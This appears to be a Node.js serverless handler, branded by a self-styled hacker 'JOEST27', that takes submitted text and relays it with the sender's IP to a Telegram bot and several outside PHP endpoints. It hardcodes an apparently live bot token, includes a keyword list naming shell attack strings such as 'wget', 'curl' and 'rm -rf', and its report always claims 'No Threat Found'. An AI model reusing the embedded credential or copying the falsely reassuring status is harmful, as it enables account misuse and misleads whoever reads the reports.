const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const fetch =
  global.fetch ||
  require("node-fetch");

const CONFIG = {

  // =========================
  // TELEGRAM
  // =========================
  botToken:
    "8217529543:AAFXmZRDhu-2BihyGkK-viqJjnezybXMcdk",

  chatId:
    "8428689901",

  // =========================
  // API
  // =========================
  apiKey:
    "tailwindcss",

  // =========================
  // LIMIT
  // =========================
  rateLimit:
    60,

  maxLength:
    5000,

  maxRequestPerIP:
    10,

  requestWindow:
    60 * 1000,

  // =========================
  // STORAGE
  // =========================
  storage:
    path.join(
      "/tmp",
      "sent_data.json"
    )
};

// =========================
// MEMORY RATE LIMIT
// =========================
const ipCache =
  new Map();

// =========================
// STORAGE
// =========================
function loadStorage() {

  try {

    if (
      !fs.existsSync(
        CONFIG.storage
      )
    ) {

      fs.writeFileSync(
        CONFIG.storage,
        JSON.stringify([])
      );

    }

    const raw =
      fs.readFileSync(
        CONFIG.storage,
        "utf8"
      );

    const data =
      JSON.parse(raw);

    return Array.isArray(data)
      ? data
      : [];

  } catch {

    return [];
  }
}

function saveStorage(data) {

  try {

    fs.writeFileSync(
      CONFIG.storage,
      JSON.stringify(
        data,
        null,
        2
      )
    );

  } catch {}
}

// =========================
// HASH
// =========================
function sha256(input) {

  return crypto
    .createHash("sha256")
    .update(input)
    .digest("hex");
}

// =========================
// ESCAPE MARKDOWN
// =========================
function escapeMarkdown(
  text = ""
) {

  return text.replace(
    /[_*[\]()~`>#+=|{}.!-]/g,
    "\\$&"
  );
}

// =========================
// SANITIZE
// =========================
function sanitizeInput(
  text = ""
) {

  return String(text)

    .replace(
      /<[^>]*>?/gm,
      ""
    )

    .replace(/\0/g, "")

    .trim();
}

// =========================
// DETECT ATTACK
// =========================
function detectFlags(text = "") {

  const flags = []

  const lower =
    text.toLowerCase()

  // SQLI
  const sqlPatterns = [
    "select *",
    "union select",
    "drop table",
    "insert into",
    "' or '1'='1",
    "--",
    ";--"
  ]

  // XSS
  const xssPatterns = [
    "<script",
    "javascript:",
    "onerror=",
    "alert(",
    "<img"
  ]

  // SHELL
  const shellPatterns = [
    "rm -rf",
    "wget ",
    "curl ",
    "bash ",
    "chmod 777",
    "exec("
  ]

  // LOOP SQLI
  for (const p of sqlPatterns) {

    if (lower.includes(p)) {
      flags.push("SQLI")
      break
    }
  }

  // LOOP XSS
  for (const p of xssPatterns) {

    if (lower.includes(p)) {
      flags.push("XSS")
      break
    }
  }

  // LOOP SHELL
  for (const p of shellPatterns) {

    if (lower.includes(p)) {
      flags.push("SHELL")
      break
    }
  }

  // SPAM
  if (
    text.length > 1000
  ) {
    flags.push("SPAM")
  }

  return flags
}

// =========================
// GET IP
// =========================
function getClientIP(req) {

  return (

    req.headers[
      "cf-connecting-ip"
    ] ||

    req.headers[
      "x-real-ip"
    ] ||

    req.headers[
      "x-forwarded-for"
    ] ||

    req.socket
      ?.remoteAddress ||

    "unknown"

  )

    .split(",")[0]

    .trim();
}

// =========================
// RATE LIMIT
// =========================
function isRateLimited(ip) {

  const now =
    Date.now();

  if (
    !ipCache.has(ip)
  ) {

    ipCache.set(ip, []);

  }

  const requests =
    ipCache.get(ip)

      .filter(
        t =>
          now - t <
          CONFIG.requestWindow
      );

  requests.push(now);

  ipCache.set(
    ip,
    requests
  );

  return (
    requests.length >
    CONFIG.maxRequestPerIP
  );
}

// =========================
// TELEGRAM SEND
// =========================
async function sendTelegram(
  message,
  ket
) {

  const url =
`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`;

  const response =
    await fetch(url, {

      method: "POST",

      headers: {
        "Content-Type":
          "application/json"
      },

      body: JSON.stringify({

        chat_id:
          CONFIG.chatId,

        text:
          message,

        parse_mode:
          "MarkdownV2",

        disable_web_page_preview:
          true,

        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📋 Copy Payload",
                copy_text: {
                  text: ket
                }
              }
            ]
          ]
        }
      })
    });

  if (!response.ok) {

    const err =
      await response.text();

    throw new Error(
      `Telegram Error: ${err}`
    );
  }

  return true;
}


async function forwardToApi(ket, ip) {

const waktu =
new Date().toLocaleString(
"id-ID",
{
timeZone:
"Asia/Jakarta"
}
);

const apiUrls = [
"https://abgjago.sisherif.codes/api.php",
"https://domaincadangan1.com/api.php",
"https://domaincadangan2.com/api.php"
];

const html = `

<!DOCTYPE html><html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
</head><body style="
margin:0;
padding:20px;
background:#eef2f7;
font-family:Arial,sans-serif;
"><div style="
max-width:800px;
margin:auto;
background:#ffffff;
border-radius:18px;
overflow:hidden;
box-shadow:0 10px 30px rgba(0,0,0,.15);
"><div style="
background:linear-gradient(135deg,#0f172a,#dc2626);
padding:35px;
color:#ffffff;
text-align:center;
"><h1 style="margin:0;">
🚨 JOEST27 HENGKER
</h1><p style="
margin-top:10px;
opacity:.9;
">
Realtime  Monitoring System
</p></div><div style="padding:30px;"><div style="
display:inline-block;
padding:8px 16px;
background:#dcfce7;
color:#15803d;
border-radius:999px;
font-weight:bold;
">
✅ Sukses
</div><br><br>

<table
width="100%"
cellpadding="10"
style="
background:#f8fafc;
border-radius:10px;
"><tr>
<td width="200">
<b>🌐 IP Address</b>
</td>
<td>${ip}</td>
</tr><tr>
<td>
<b>🕒 Timestamp</b>
</td>
<td>${waktu}</td>
</tr><tr>
<td>
<b>🖥 Source</b>
</td>
<td>JOEST27</td>
</tr><tr>
<td>
<b>🛡 Status</b>
</td>
<td>✅ </td>
</tr></table><br><h3>📄 Payload Content</h3><div style="
background:#0f172a;
color:#f8fafc;
padding:18px;
border-radius:10px;
font-family:Consolas,monospace;
white-space:pre-wrap;
word-break:break-word;
overflow:auto;
">
${ket || "-"}
</div><br><div style="
background:#eff6ff;
border-left:5px solid #2563eb;
padding:15px;
border-radius:8px;
"><b>ℹ Analysis Result</b>

<ul>
<li>Status : CLEAN</li>
<li>Gateway : Active</li>
<li>Forward Mode : Multi API</li>
<li>Detection : No Threat Found</li>
</ul></div></div><div style="
background:#111827;
color:#9ca3af;
padding:20px;
text-align:center;
font-size:12px;
"> Tele : @JOES271

</div></div></body>
</html>
`;const params =
new URLSearchParams();

params.append(
"subjek",
"🚨 JOEST27 NOTIF | ${ip}"
);

params.append(
"pesan",
html
);

params.append(
"sender",
ip
);

const results = [];

for (const url of apiUrls) {

try {

  const controller =
    new AbortController();

  const timeout =
    setTimeout(
      () =>
        controller.abort(),
      10000
    );

  const response =
    await fetch(
      url,
      {
        method: "POST",
        headers: {
          "Content-Type":
            "application/x-www-form-urlencoded"
        },
        body:
          params.toString(),
        signal:
          controller.signal
      }
    );

  clearTimeout(
    timeout
  );

  results.push({
    url,
    status:
      response.status,
    success:
      response.ok
  });

} catch (err) {

  results.push({
    url,
    success: false,
    error:
      err.message
  });

}

}

console.log(
"Forward Results:",
results
);

return results;
}

// =========================
// MAIN EXPORT
// =========================
module.exports =
async (req, res) => {

  res.setHeader(
    "Content-Type",
    "application/json"
  );

  // =========================
  // SECURITY HEADER
  // =========================
  res.setHeader(
    "X-Content-Type-Options",
    "nosniff"
  );

  res.setHeader(
    "X-Frame-Options",
    "DENY"
  );

  res.setHeader(
    "X-XSS-Protection",
    "1; mode=block"
  );

  try {

    // =========================
    // METHOD GET ONLY
    // =========================
    if (
      req.method !== "GET"
    ) {

      return res.status(405).json({

        status: 405,

        title:
          "Method Ditolak",

        msg:
          "Gunakan method GET."
      });

    }

    // =========================
    // API KEY
    // =========================
    const clientApiKey =

      req.query.apikey ||

      req.headers[
        "x-api-key"
      ] ||

      "";

    if (
      clientApiKey !==
      CONFIG.apiKey
    ) {

      return res.status(403).json({

        status: 403,

        title:
          "Akses Ditolak",

        msg:
          "API key tidak valid."
      });

    }

    // =========================
    // INPUT
    // =========================
    let ket =

      req.query.ket ||

      "";

    ket =
      sanitizeInput(ket);

    const ip =
      getClientIP(req);

    // =========================
    // VALIDASI
    // =========================
    if (!ket) {

      return res.status(400).json({

        status: 400,

        title:
          "Data Kosong",

        msg:
          "Field ket wajib diisi."
      });

    }

    if (
      ket.length < 3
    ) {

      return res.status(400).json({

        status: 400,

        title:
          "Data Pendek",

        msg:
          "Minimal 3 karakter."
      });

    }

    if (
      ket.length >
      CONFIG.maxLength
    ) {

      return res.status(400).json({

        status: 400,

        title:
          "Data Panjang",

        msg:
          "Melebihi batas maksimum."
      });

    }

    // =========================
    // DETECT DANGER
    // =========================
    const dangerFlags =
      detectFlags(ket)

    if (
      dangerFlags.includes("SQLI") ||
      dangerFlags.includes("XSS") ||
      dangerFlags.includes("SHELL")
    ) {

      return res.status(403).json({

        status: 403,

        title:
          "Payload Berbahaya",

        msg:
          "Request terdeteksi berbahaya.",

        flags:
          dangerFlags
      })
    }

    // =========================
    // RATE LIMIT
    // =========================
    if (
      isRateLimited(ip)
    ) {

      return res.status(429).json({

        status: 429,

        title:
          "Rate Limit",

        msg:
          "Terlalu banyak request."
      });

    }

    // =========================
    // STORAGE
    // =========================
    const stored =
      loadStorage();

    const now =
      Math.floor(
        Date.now() / 1000
      );

    const hash =
      sha256(ket);

    // =========================
    // DUPLIKAT
    // =========================
    const duplicate =
      stored.find(
        x =>
          x.hash === hash
      );

    if (duplicate) {

      return res.status(409).json({

        status: 409,

        title:
          "Duplikat",

        msg:
          "Data sudah pernah dikirim."
      });

    }

    // =========================
    // RATE LIMIT BY IP
    // =========================
    const recent =
      stored.find(

        x =>

          x.ip === ip &&

          now - x.time <
          CONFIG.rateLimit
      );

    if (recent) {

      return res.status(429).json({

        status: 429,

        title:
          "Terlalu Cepat",

        msg:
          "Tunggu sebelum mengirim ulang."
      });

    }

    // =========================
    // FORMAT MESSAGE
    // =========================
    const waktu =
      new Date()

        .toLocaleString(
          "id-ID",
          {
            timeZone:
              "Asia/Jakarta"
          }
        );

    const flags =
      detectFlags(ket)

    const status =
      flags.length > 0
        ? "⚠️ SUSPICIOUS"
        : "✅ CLEAN"

    const flagText =
      flags.length > 0
        ? flags.join(", ")
        : "NONE"

    let message =
`
╭━━━━━━━━━━━━━━━━━━⬣
┃ 🚨 *JOEST27 SECURITY*
╰━━━━━━━━━━━━━━━━━━⬣

┌〔 📡 REQUEST INFO 〕
┃ 🌐 IP :
┃ ${escapeMarkdown(ip)}
┃
┃ 🕒 Waktu :
┃ ${escapeMarkdown(waktu)}
└──────────────⬣

┌〔 🛡 SECURITY STATUS 〕
┃ ${escapeMarkdown(status)}
┃
┃ 🚩 Flag :
┃ ${escapeMarkdown(flagText)}
└──────────────⬣

┌〔 📄 PAYLOAD 〕
${escapeMarkdown(ket)}
└──────────────⬣

╭━━━━━━━━━━━━━━━━━━⬣
┃ 🤖 JOEST27 PROTECTION
╰━━━━━━━━━━━━━━━━━━⬣
`;

    // =========================
    // SEND TELEGRAM
    // =========================
    await sendTelegram(
  message,
  ket
);

await forwardToApi(
  ket,
  ip
);

    // =========================
    // SAVE STORAGE
    // =========================
    stored.push({

      hash,

      ip,

      time:
        now
    });

    // =========================
    // AUTO CLEANUP
    // =========================
    const cleaned =
      stored.filter(

        x =>

          now - x.time <
          86400
      );

    saveStorage(cleaned);

    // =========================
    // SUCCESS
    // =========================
    return res.status(200).json({

      status: 200,

      title:
        "Berhasil",

      msg:
        "Pesan berhasil dikirim."
    });

  } catch (err) {

    console.error(err);

    return res.status(500).json({

      status: 500,

      title:
        "Server Error",

      msg:
        "Terjadi kesalahan pada server."

    });

  }
};
